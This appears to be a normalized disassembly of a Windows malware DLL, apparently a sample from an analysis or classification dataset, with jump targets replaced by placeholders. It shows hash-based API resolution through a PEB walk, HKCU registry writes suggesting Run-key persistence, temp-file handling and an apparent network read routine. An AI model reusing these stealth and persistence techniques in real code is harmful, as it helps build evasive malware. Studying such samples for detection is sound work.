sub_1000101d
push ebp
mov ebp esp
push ecx
lea eax [ esi + esi ]
push edi
mov [ ebp - 0x4 ] eax
call [ GetProcessHeap@IAT ]
push [ ebp - 0x4 ]
push 0x8
push eax
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
push 0x1e
push 0x0
push 0x9
push esi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
push edi
call sub_10007a86
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
mov eax edi
push edi
call sub_10001000
and [ ebx ] 0x0
jmp r-xdata
pop edi
leave
retn 0x4
sub_10001073
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ lstrcatA@IAT ]
push edi
xor ebx ebx
cmp [ ebp + 0xc ] 0x0
ja r-xdata
xor edi edi
inc edi
dec [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
cmp [ ecx + eax ] 0x0
jne r-xdata
jmp r-xdata
cmp dl 0x41
jb r-xdata
cmp dl 0x7a
jbe r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn 0xc
xor ebx ebx
mov [ ebp + 0xc ] ecx
add edi 0x4
cmp dl 0x5a
ja r-xdata
mov ebx eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
sub ecx edi
add eax ecx
mov dl [ eax ]
cmp dl 0x61
jb r-xdata
test ebx ebx
je r-xdata
inc edi
cmp edi 0x4
jle r-xdata
and [ ebp - 0x4 ] 0x0
lea edi [ ebp - 0x4 ]
call sub_100020cf
test eax eax
je r-xdata
push ebx
push [ ebp - 0x4 ]
call esi
push r--data
push [ ebp - 0x4 ]
call esi
xor edi edi
push edi
push 0x6
push 0x3
push edi
push 0x1
push 0x80000000
push [ ebp - 0x4 ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x4 ]
push edi
push [ ebp + 0x10 ]
call [ HeapFree@IAT ]
push eax
push 0x1
push 0xed00c776
push r--data
call sub_10001347
add esp 0x10
push [ ebp - 0x4 ]
call [ DeleteFileA@IAT ]
test eax eax
jne r-xdata
xor ebx ebx
sub_10001151
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
xor edi edi
mov [ ebp - 0x18 ] edi
call [ GetProcessHeap@IAT ]
push [ ebp + 0x8 ]
mov esi r--data
push edi
push 0x1a
push 0x3
push 0x5f230322
push esi
mov [ ebp - 0x4 ] eax
call sub_10001347
add esp 0x18
mov [ ebp + 0x8 ] eax
cmp eax edi
je r-xdata
mov eax [ ebp - 0x18 ]
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x24 ] eax
cmp eax edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov edi 0x10000
push edi
push 0x8
push [ ebp - 0x4 ]
mov ebx eax
call [ HeapAlloc@IAT ]
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x8 ] eax
push [ ebp + 0x8 ]
push 0x1
push 0xed00c776
push esi
call sub_10001347
add esp 0x10
xor eax eax
jmp r-xdata
add ebx edi
inc [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] 0xa
jl r-xdata
call [ GetProcessHeap@IAT ]
push eax
push edi
push [ ebp - 0x8 ]
call sub_10001073
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
push edi
push 0x0
push [ ebp - 0x8 ]
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
lea eax [ ebp - 0x1c ]
push eax
push edi
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x8 ]
push 0x5
push 0xed302ff4
push esi
call sub_10001347
add esp 0x38
test eax eax
je r-xdata
jmp r-xdata
sub ebx [ ebp - 0x8 ]
add ebx eax
mov [ ebp - 0x14 ] ebx
jne r-xdata
push [ ebp - 0x8 ]
push 0x0
push [ ebp - 0x4 ]
call [ HeapFree@IAT ]
jmp r-xdata
and [ ebp - 0xc ] 0x0
lea edi [ ebp - 0xc ]
call sub_100020cf
test eax eax
je r-xdata
push [ ebp - 0x20 ]
mov edi [ lstrcatA@IAT ]
push [ ebp - 0xc ]
call edi
push r--data
push [ ebp - 0xc ]
call edi
push [ ebp - 0x8 ]
mov ebx [ HeapFree@IAT ]
push 0x0
push [ ebp - 0x4 ]
call ebx
and [ ebp - 0x10 ] 0x0
lea edi [ ebp - 0x10 ]
call sub_100020cf
test eax eax
jne r-xdata
push r--data
push [ ebp - 0x10 ]
call [ lstrcatA@IAT ]
xor edi edi
push edi
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push 0x3
push 0x23170591
push esi
call sub_10001347
add esp 0x18
push [ ebp - 0x10 ]
push edi
push [ ebp - 0x4 ]
test eax eax
jne r-xdata
push [ ebp - 0xc ]
push eax
call ebx
push [ ebp - 0xc ]
push edi
push [ ebp - 0x4 ]
call ebx
push edi
push edi
push [ ebp - 0x14 ]
push [ ebp - 0x24 ]
push edi
push edi
push [ ebp + 0x8 ]
push 0x7
push 0x3ebb8224
push esi
call sub_10001347
add esp 0x28
mov ebx 0xed00c776
cmp eax edi
je r-xdata
call ebx
push [ ebp - 0xc ]
push edi
jmp r-xdata
push [ ebp + 0x8 ]
push 0x1
push ebx
push esi
call sub_10001347
add esp 0x10
push eax
xor edi edi
inc edi
push edi
push ebx
push esi
call sub_10001347
add esp 0x10
mov [ ebp - 0x18 ] edi
push [ ebp - 0x4 ]
call ebx
jmp r-xdata
sub_10001347
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
mov edi esp
and [ ebp - 0xc ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov [ ebp - 0xc ] eax
push [ ebp + 0x8 ]
push 0x1
push 0xfeeb6771
push 0x0
call sub_10001347
add esp 0x10
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
lea eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
and [ ebp - 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
push ebx
jmp r-xdata
imul ebx ebx 0x0
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
call sub_100013e2
mov esp edi
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov esi esp
mov eax [ ebp - 0x14 ]
inc eax
mov [ ebp - 0x14 ] eax
pop edi
pop esi
pop ebx
leave
retn
lodsd [ esi ]
push eax
loop r-xdata
sub_100013e2
push ebp
push esi
mov edx [ ebp - 0xc ]
test edx edx
jne r-xdata
push edi
mov eax [ edx + 0x3c ]
mov eax [ edx + eax + 0x78 ]
add eax edx
push eax
mov eax [ eax + 0x20 ]
add eax edx
imul ecx ecx 0x0
cld
imul eax eax 0x0
mov eax [ fs : eax + 0x30 ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x1c ]
lodsd [ esi ]
mov edx [ eax + 0x8 ]
push eax
imul eax eax 0x0
ror edi 0x13
lodsb [ esi ]
add edi eax
test eax eax
pop eax
jne r-xdata
cmp edi ebx
jne r-xdata
inc ecx
mov esi [ eax + ecx * 4 ]
add esi edx
imul edi edi 0x0
pop eax
mov ebx [ eax + 0x24 ]
add ebx edx
mov cx [ ebx + ecx * 2 ]
mov ebx [ eax + 0x1c ]
mov eax ebx
add eax edx
mov eax [ eax + ecx * 4 ]
add eax edx
pop edi
pop esi
pop ebp
jmp eax
sub_1000144e
push ebp
mov ebp esp
mov eax 0x1008
call sub_10010a80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov eax 0x400
push eax
push 0x0
mov [ ebp - 0x1008 ] eax
lea eax [ ebp - 0x1004 ]
push eax
push 0x3
mov edi 0x9af9fa4b
push edi
mov esi r--data
push esi
call sub_10001347
push [ ebp - 0x1008 ]
lea eax [ ebp - 0x804 ]
push 0x0
push eax
push 0x3
push edi
push esi
call sub_10001347
add esp 0x30
lea eax [ ebp - 0x1008 ]
push eax
lea eax [ ebp - 0x804 ]
push eax
call sub_10004f06
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1000fe6e
leave
retn 0x4
cmp [ ebp - 0x1008 ] 0x200
mov edi 0x6e587d69
mov esi r--data
ja r-xdata
push r--data
push r--data
push 0x80000001
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1004 ]
push eax
call sub_10001edd
mov eax [ ebp + 0x8 ]
dec eax
cmp eax 0x1fe
ja r-xdata
push r--data
push ebx
push 0x2
push edi
push esi
call sub_10001347
lea eax [ ebp - 0x804 ]
push eax
push ebx
push 0x2
push edi
push esi
call sub_10001347
add esp 0x28
push ebx
call sub_10002ade
push r--data
push ebx
push 0x2
push edi
push esi
call sub_10001347
lea eax [ ebp - 0x1004 ]
push eax
push ebx
push 0x2
push edi
push esi
call sub_10001347
add esp 0x28
sub_10001561
push ecx
push ecx
push ebx
mov ebx [ esp + 0x14 ]
push ebp
push esi
push edi
add ebx 0x2
push ebx
call sub_1000ff5a
push ebx
push 0x0
push eax
push 0x3
mov ebp 0x9af9fa4b
push ebp
mov esi r--data
push esi
mov [ esp + 0x2c ] eax
call sub_10001347
push ebx
call sub_1000ff5a
push ebx
push 0x0
mov edi eax
push edi
push 0x3
push ebp
push esi
call sub_10001347
push r--data
push [ esp + 0x58 ]
mov ebp 0xd75c3a47
push 0x2
push ebp
push esi
call sub_10001347
add esp 0x4c
test eax eax
je r-xdata
push [ esp + 0x1c ]
push [ esp + 0x14 ]
push 0x2
push 0x825884e9
push r--data
call sub_10001347
add esp 0x14
push r--data
push [ esp + 0x20 ]
push 0x2
push ebp
push esi
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
push [ esp + 0x10 ]
push edi
push 0x2
push ebp
push esi
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
xor esi esi
push r--data
push r--data
push 0x80000001
lea eax [ esp + 0x2c ]
push eax
push edi
call sub_10001edd
mov [ esp + 0x14 ] eax
test eax eax
jne r-xdata
push r--data
push [ esp + 0x20 ]
push 0x2
push ebp
push esi
call sub_10001347
push eax
push edi
push 0x2
push 0x825884e9
push r--data
call sub_10001347
lea eax [ edi + 0x2 ]
push eax
push [ esp + 0x3c ]
push 0x2
push 0x825884e9
push r--data
call sub_10001347
push ebx
push 0x0
push edi
push 0x3
push 0x9af9fa4b
push esi
call sub_10001347
add esp 0x54
jmp r-xdata
mov esi [ esp + 0x14 ]
jmp r-xdata
push [ esp + 0x10 ]
call sub_10002ade
test eax eax
jbe r-xdata
push edi
call sub_1000fe7d
push [ esp + 0x14 ]
call sub_1000fe7d
pop ecx
pop ecx
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn 0x8
push ebx
call sub_1000ff5a
push ebx
push 0x0
push eax
push 0x3
push 0x9af9fa4b
push esi
mov [ esp + 0x38 ] eax
call sub_10001347
push [ esp + 0x2c ]
push edi
push 0x2
push ebp
push esi
call sub_10001347
push eax
push [ esp + 0x50 ]
push 0x2
push 0x825884e9
push r--data
call sub_10001347
add esp 0x44
push [ esp + 0x1c ]
call sub_10002ade
push edi
mov [ esp + 0x18 ] eax
call sub_10002ade
mov ebp eax
mov eax [ esp + 0x14 ]
sub ebp eax
je r-xdata
push r--data
call sub_10001f52
mov eax [ esp + 0x20 ]
add eax 0x2
push eax
push 0x0
push [ esp + 0x24 ]
push 0x3
push 0x9af9fa4b
push esi
call sub_10001347
add ebp 0xfffffffe
push ebp
push edi
push [ esp + 0x3c ]
call sub_10010ab0
add esp 0x24
push 0x1
push r--data
push r--data
push 0x80000001
push ebx
push [ esp + 0x30 ]
call sub_10001e34
jmp r-xdata
push [ esp + 0x1c ]
mov [ esp + 0x18 ] eax
call sub_1000fe7d
pop ecx
sub_1000177e
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov eax 0x400
push edi
push eax
mov [ ebp - 0x4 ] eax
call sub_1000ff5a
push [ ebp - 0x4 ]
mov ebx eax
push 0x0
push ebx
push 0x3
mov edi 0x9af9fa4b
push edi
mov esi r--data
push esi
mov [ ebp - 0x8 ] ebx
call sub_10001347
add esp 0x1c
push r--data
push r--data
push 0x80000001
lea eax [ ebp - 0x4 ]
push eax
push ebx
call sub_10001edd
push ebx
mov [ ebp - 0xc ] eax
call sub_10002ade
push [ ebp + 0x8 ]
mov ebx eax
call sub_10002ade
lea eax [ ebx + eax + 0x8 ]
push eax
mov [ ebp - 0x4 ] eax
call sub_1000ff5a
push [ ebp - 0x4 ]
mov ebx eax
push 0x0
push ebx
push 0x3
push edi
push esi
call sub_10001347
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push r--data
push ebx
call [ wsprintfW@IAT ]
add esp 0x2c
cmp [ ebp - 0xc ] 0x0
jle r-xdata
push ebx
call sub_10002ade
push 0x1
push r--data
push r--data
push 0x80000001
push eax
push ebx
mov [ ebp - 0x4 ] eax
call sub_10001e34
push [ ebp - 0x8 ]
mov esi eax
call sub_1000fe7d
push ebx
call sub_1000fe7d
pop ecx
pop ecx
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x8
push r--data
push ebx
push 0x2
mov edi 0x6e587d69
push edi
mov esi r--data
push esi
call sub_10001347
push [ ebp - 0x8 ]
push ebx
push 0x2
push edi
push esi
call sub_10001347
add esp 0x28
sub_10001880
push ebp
lea ebp [ esp - 0x398 ]
sub esp 0x418
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x394 ] eax
and [ ebp - 0x80 ] 0x0
push esi
push edi
lea eax [ ebp - 0x80 ]
push eax
push r--data
push 0x6
push 0x3
push 0x6be04c6d
mov esi r--data
push esi
call sub_10001347
mov edi 0x104
push edi
lea eax [ ebp - 0x7c ]
push eax
push [ ebp - 0x80 ]
push 0x3
push 0xf60a831
push esi
call sub_10001347
lea eax [ ebp - 0x7c ]
push eax
push 0x1
push 0x56e87f69
push esi
call sub_10001347
add esp 0x40
test eax eax
jbe r-xdata
mov ecx [ ebp + 0x394 ]
pop edi
xor ecx ebp
pop esi
call sub_1000fe6e
add ebp 0x398
leave
retn
push edi
push 0x0
lea eax [ ebp + 0x18c ]
push eax
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
lea eax [ ebp + 0x18c ]
push eax
push edi
push 0x2
push 0x88ea0179
push esi
call sub_10001347
push r--data
lea eax [ ebp + 0x18c ]
push eax
push 0x2
push 0x6e587d69
push esi
call sub_10001347
add esp 0x40
lea eax [ ebp + 0x18c ]
push eax
call sub_10001fc3
test eax eax
jne r-xdata
push eax
lea eax [ ebp + 0x18c ]
push eax
lea eax [ ebp - 0x7c ]
push eax
push 0x3
push 0x2319c591
push esi
call sub_10001347
push 0x6
lea eax [ ebp + 0x18c ]
push eax
push 0x2
push 0x34baad82
push esi
call sub_10001347
add esp 0x2c
sub_10001999
push ebp
lea ebp [ esp - 0x194 ]
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x190 ] eax
call sub_10001880
call sub_10002b33
test eax eax
je r-xdata
push edi
call [ GetProcessHeap@IAT ]
and [ ebp - 0x7c ] 0x0
lea edi [ ebp - 0x7c ]
mov [ ebp - 0x80 ] eax
call sub_1000200c
test eax eax
je r-xdata
push 0x1
push r--data
call RunReg
pop ecx
pop ecx
xor eax eax
jmp r-xdata
pop edi
push ebx
push esi
mov ebx r--data
push ebx
push [ ebp - 0x7c ]
mov edi 0x6e587d69
push 0x2
push edi
mov esi r--data
push esi
call sub_10001347
add esp 0x14
push [ ebp - 0x7c ]
call sub_10001fc3
test eax eax
jne r-xdata
mov ecx [ ebp + 0x190 ]
xor ecx ebp
call sub_1000fe6e
add ebp 0x194
leave
retn
push [ ebp - 0x7c ]
push 0x0
push [ ebp - 0x80 ]
call [ HeapFree@IAT ]
xor eax eax
inc eax
push 0x104
push eax
lea eax [ ebp - 0x78 ]
push eax
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
add esp 0x18
push 0x104
lea eax [ ebp - 0x78 ]
push eax
call [ GetWindowsDirectoryW@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x7c ]
push 0x0
push [ ebp - 0x80 ]
call [ HeapFree@IAT ]
xor eax eax
jmp r-xdata
push r--data
lea eax [ ebp - 0x78 ]
push eax
push 0x2
push edi
push esi
call sub_10001347
push ebx
lea eax [ ebp - 0x78 ]
push eax
push 0x2
push edi
push esi
call sub_10001347
add esp 0x28
lea eax [ ebp - 0x78 ]
push eax
call sub_10001fc3
test eax eax
je r-xdata
pop esi
pop ebx
push 0x0
push [ ebp - 0x7c ]
lea eax [ ebp - 0x78 ]
push eax
push 0x3
push 0x2319c591
push esi
call sub_10001347
push 0x6
push [ ebp - 0x7c ]
push 0x2
push 0x34baad82
push esi
call sub_10001347
add esp 0x2c
sub_10001af1
mov eax [ esp + 0x8 ]
sub eax 0x0
je r-xdata
push 0x7d0
push 0x1
push 0x9ace3327
push r--data
call sub_10001347
add esp 0x10
dec eax
jne r-xdata
xor eax eax
inc eax
retn 0xc
call sub_10001999
test eax eax
je r-xdata
call AGTwLoad
jmp r-xdata
sub_10001b2c
push ebp
lea ebp [ esp - 0xc0 ]
sub esp 0x140
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xbc ] eax
push ebx
push esi
push edi
mov esi ecx
call [ GetProcessHeap@IAT ]
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push r--data
push 0x6
push 0xd5a314bd
mov edi r--data
push edi
mov [ ebp - 0x80 ] eax
call sub_10001347
add esp 0x20
mov [ ebp - 0x78 ] eax
cmp eax ebx
jne r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
xor eax eax
push ebx
push ebx
push 0x3
push [ esi + 0x4 ]
push ebx
push [ esi + 0x10 ]
push [ esi ]
push eax
push 0x8
push 0x9a77a46c
push edi
call sub_10001347
add esp 0x2c
mov [ ebp - 0x7c ] eax
cmp eax ebx
jne r-xdata
mov [ esi + 0x10 ] 0x50
lea eax [ ebp + 0x94 ]
cmp [ esi + 0x14 ] ebx
je r-xdata
push [ ebp - 0x78 ]
push 0x1
push 0xed684d1c
push edi
call sub_10001347
add esp 0x10
jmp r-xdata
push r--data
push r--data
jmp r-xdata
mov eax [ esi + 0xc ]
xor ecx ecx
cmp eax ebx
jbe r-xdata
push [ ebp - 0x7c ]
mov esi 0xed684d1c
push 0x1
push esi
push edi
call sub_10001347
push [ ebp - 0x78 ]
push 0x1
push esi
push edi
call sub_10001347
add esp 0x20
jmp r-xdata
push eax
push 0x2
push 0x825884e9
push r--data
call sub_10001347
add esp 0x14
push ebx
push ebx
push ebx
push ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp + 0x94 ]
push eax
push [ ebp - 0x7c ]
push 0x8
push 0x19b891a8
push edi
call sub_10001347
add esp 0x2c
mov [ ebp - 0x74 ] eax
cmp eax ebx
jne r-xdata
push eax
push ecx
push ebx
push r--data
push [ ebp - 0x74 ]
push 0x5
push 0x587311cc
push edi
call sub_10001347
add esp 0x20
test eax eax
jne r-xdata
mov ecx [ esi + 0x8 ]
push 0x8
push 0x8
push [ ebp - 0x80 ]
call [ HeapAlloc@IAT ]
mov ebx 0x100
push ebx
push 0x8
push [ ebp - 0x80 ]
mov esi eax
call [ HeapAlloc@IAT ]
and [ esi + 0x4 ] 0x0
push ebx
push 0x0
mov [ esi ] eax
lea eax [ ebp - 0x6c ]
push eax
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
and [ ebp - 0x70 ] 0x0
lea eax [ ebp - 0x70 ]
push eax
push ebx
lea eax [ ebp - 0x6c ]
push eax
push [ ebp - 0x74 ]
push 0x4
push 0x28863658
push edi
call sub_10001347
add esp 0x34
jmp r-xdata
xor esi esi
test eax eax
jne r-xdata
mov ecx [ ebp + 0xbc ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000fe6e
add ebp 0xc0
leave
retn
cmp [ ebp - 0x70 ] 0x0
je r-xdata
push [ ebp - 0x74 ]
push 0x1
push 0xed684d1c
push edi
call sub_10001347
add esp 0x10
jmp r-xdata
mov eax [ esi + 0x4 ]
add eax [ ebp - 0x70 ]
push eax
push [ esi ]
push 0x8
push [ ebp - 0x80 ]
call [ HeapReAlloc@IAT ]
mov [ esi ] eax
push [ ebp - 0x70 ]
lea ecx [ ebp - 0x6c ]
push ecx
mov ecx [ esi + 0x4 ]
add ecx eax
push ecx
call sub_10010ab0
mov eax [ ebp - 0x70 ]
add [ esi + 0x4 ] eax
push ebx
push 0x0
lea eax [ ebp - 0x6c ]
push eax
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
lea eax [ ebp - 0x70 ]
push eax
push ebx
lea eax [ ebp - 0x6c ]
push eax
push [ ebp - 0x74 ]
push 0x4
push 0x28863658
push edi
call sub_10001347
add esp 0x40
push [ ebp - 0x7c ]
mov ebx 0xed684d1c
push 0x1
push ebx
push edi
call sub_10001347
push [ ebp - 0x78 ]
push 0x1
push ebx
push edi
call sub_10001347
add esp 0x20
mov eax esi
jmp r-xdata
sub_10001d8e
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ GetProcAddress@IAT ]
push edi
push r--data
push [ ebp + 0xc ]
xor edi edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x4 ] edi
call esi
mov ebx eax
cmp ebx edi
jne r-xdata
push r--data
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x10 ] eax
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push r--data
push [ ebp + 0xc ]
call esi
mov esi eax
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
push 0xf0000000
push 0x1
push edi
push edi
lea eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
or [ ebp - 0x8 ] 0xffffffff
mov eax [ ebp - 0x8 ]
cmp eax edi
jl r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
div [ ebp + 0x8 ]
cmp edx edi
mov [ ebp - 0x8 ] edx
jl r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x4
push [ ebp - 0x4 ]
call esi
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
push edi
push [ ebp - 0x4 ]
call [ ebp - 0x10 ]
sub_10001e34
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
lea eax [ ebp - 0x4 ]
push eax
mov edi 0xf003f
push edi
xor ebx ebx
push ebx
push [ ebp + 0x14 ]
mov esi r--data
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ebx
push 0x5
push 0xb5e24d91
push esi
call sub_10001347
add esp 0x20
cmp eax ebx
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
push ebx
push [ ebp + 0x18 ]
push [ ebp - 0x4 ]
push 0x6
push 0x81a0a509
push esi
call sub_10001347
xor ecx ecx
add esp 0x24
inc ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push edi
push ebx
push r--data
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x9
push 0x65480977
push esi
call sub_10001347
add esp 0x30
cmp eax ebx
jne r-xdata
push [ ebp - 0x4 ]
push ecx
push 0x7844aff
push esi
call sub_10001347
add esp 0x10
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
leave
retn 0x18
sub_10001edd
push ebp
mov ebp esp
push ecx
push esi
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x20019
xor edi edi
push edi
push [ ebp + 0x14 ]
mov esi r--data
push [ ebp + 0x10 ]
mov [ ebp - 0x4 ] edi
push 0x5
push 0xb5e24d91
push esi
call sub_10001347
add esp 0x20
test eax eax
jne r-xdata
mov eax edi
pop edi
pop esi
leave
retn 0x14
push [ ebp + 0xc ]
lea eax [ ebp + 0x14 ]
push [ ebp + 0x8 ]
push eax
push edi
push [ ebp + 0x18 ]
push [ ebp - 0x4 ]
push 0x6
push 0x67db8066
push esi
call sub_10001347
add esp 0x24
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
push 0x1
push 0x7844aff
push esi
call sub_10001347
add esp 0x10
inc edi
sub_10001f52
push ebp
mov ebp esp
push ecx
push esi
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x2
xor edi edi
push edi
push r--data
push 0x80000001
push 0x5
push 0xb5e24d91
mov esi r--data
push esi
mov [ ebp - 0x4 ] edi
call sub_10001347
add esp 0x20
test eax eax
je r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push 0x2
push 0x28f4618b
push esi
call sub_10001347
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push [ ebp - 0x4 ]
push 0x1
push 0x7844aff
push esi
call sub_10001347
add esp 0x10
mov eax edi
xor edi edi
inc edi
pop edi
pop esi
leave
retn 0x4
sub_10001fc3
push esi
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x1
push 0x80000000
push [ esp + 0x20 ]
mov esi r--data
push 0x7
push 0x47763959
push esi
call sub_10001347
add esp 0x28
cmp eax 0xffffffff
je r-xdata
xor eax eax
push eax
push 0x1
push 0xed00c776
push esi
call sub_10001347
xor eax eax
add esp 0x10
inc eax
jmp r-xdata
pop esi
retn 0x4
sub_1000200c
push ebp
mov ebp esp
sub esp 0x808
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ edi ] 0x0
jne r-xdata
push ebx
push esi
mov esi 0x400
push esi
push 0x0
lea eax [ ebp - 0x804 ]
push eax
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
lea eax [ ebp - 0x804 ]
push eax
push esi
push 0x2
push 0x88ea0179
push r--data
call sub_10001347
mov ebx eax
add esp 0x2c
test ebx ebx
ja r-xdata
call [ GetProcessHeap@IAT ]
push 0x104
push 0x8
push eax
mov [ ebp - 0x808 ] eax
call [ HeapAlloc@IAT ]
mov [ edi ] eax
test eax eax
je r-xdata
lea esi [ ebp - 0x804 ]
call sub_10002185
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000fe6e
leave
retn
lea eax [ ebx + ebx ]
push eax
lea eax [ ebp - 0x804 ]
push eax
push [ edi ]
call sub_10010ab0
xor eax eax
add esp 0xc
inc eax
push [ ebp - 0x808 ]
push eax
push edi
call [ HeapFree@IAT ]
pop esi
pop ebx
sub_100020cf
push ebp
mov ebp esp
sub esp 0x408
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
cmp [ edi ] ebx
jne r-xdata
push esi
mov esi 0x400
push esi
push 0x0
lea eax [ ebp - 0x404 ]
push eax
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
add esp 0x18
lea eax [ ebp - 0x404 ]
push eax
push esi
call [ GetTempPathA@IAT ]
mov [ ebp - 0x408 ] eax
test eax eax
ja r-xdata
call [ GetProcessHeap@IAT ]
push 0x104
mov ebx eax
push 0x8
push ebx
call [ HeapAlloc@IAT ]
mov [ edi ] eax
test eax eax
je r-xdata
lea esi [ ebp - 0x404 ]
call sub_100021e0
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_1000fe6e
leave
retn
push [ ebp - 0x408 ]
lea eax [ ebp - 0x404 ]
push eax
push [ edi ]
call sub_10010ab0
xor eax eax
add esp 0xc
inc eax
push ebx
push eax
push edi
call [ HeapFree@IAT ]
pop esi
sub_10002185
push esi
push 0x1
push 0x56e87f69
push r--data
call sub_10001347
add esp 0x10
test eax eax
ja r-xdata
xor edx edx
push edi
xor eax eax
retn
inc edx
cmp edx eax
jbe r-xdata
push 0x5a
pop edi
cmp di cx
jb r-xdata
movzx ecx [ esi + edx * 2 ]
push 0x41
pop edi
cmp di cx
ja r-xdata
xor eax eax
inc eax
pop edi
retn
push 0x61
pop edi
cmp di cx
ja r-xdata
add ecx 0x20
mov [ esi + edx * 2 ] cx
push 0x7a
pop edi
cmp di cx
jb r-xdata
xor edi edi
cmp di cx
jb r-xdata
sub_100021e0
push esi
call [ lstrlenA@IAT ]
test eax eax
ja r-xdata
xor edx edx
xor eax eax
retn
inc edx
cmp edx eax
jbe r-xdata
cmp cl 0x5a
jg r-xdata
mov cl [ edx + esi ]
cmp cl 0x41
jl r-xdata
xor eax eax
inc eax
retn
cmp cl 0x61
jl r-xdata
add cl 0x20
mov [ edx + esi ] cl
cmp cl 0x7a
jg r-xdata
test cl cl
jg r-xdata
sub_1000221a
push ebp
lea ebp [ esp - 0x1bc ]
sub esp 0x23c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x1b8 ] eax
push esi
push edi
mov esi ecx
xor edi edi
mov [ ebp - 0x80 ] esi
mov [ ebp - 0x78 ] edi
call sub_10002185
test eax eax
je r-xdata
